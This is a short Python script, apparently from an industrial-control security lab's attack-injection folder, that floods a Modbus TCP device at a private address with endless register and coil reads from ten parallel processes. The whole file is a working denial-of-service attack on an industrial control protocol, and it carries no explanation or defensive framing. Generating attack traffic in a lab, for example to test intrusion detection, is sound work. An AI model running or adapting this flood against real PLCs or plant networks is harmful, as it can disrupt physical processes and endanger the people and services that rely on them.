# scripts/attack_injection/dos_flood.py

import time
import multiprocessing
from pymodbus.client import ModbusTcpClient

def flood_worker(worker_id):
    client = ModbusTcpClient('192.168.64.1', port=502)
    client.connect()
    print(f"Worker {worker_id} started flooding...")
    try:
        while True:
            client.read_coils(1, 10, slave=1)
            client.read_holding_registers(0, 5, slave=1)
    except Exception as e:
        print(f"Worker {worker_id} error: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    N = 10
    procs = []
    for i in range(N):
        p = multiprocessing.Process(target=flood_worker, args=(i+1,))
        p.daemon = True
        p.start()
        procs.append(p)

    print(f"Started {N} flood workers. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping workers...")
        for p in procs:
            p.terminate()
        print("DOS flood stopped.")
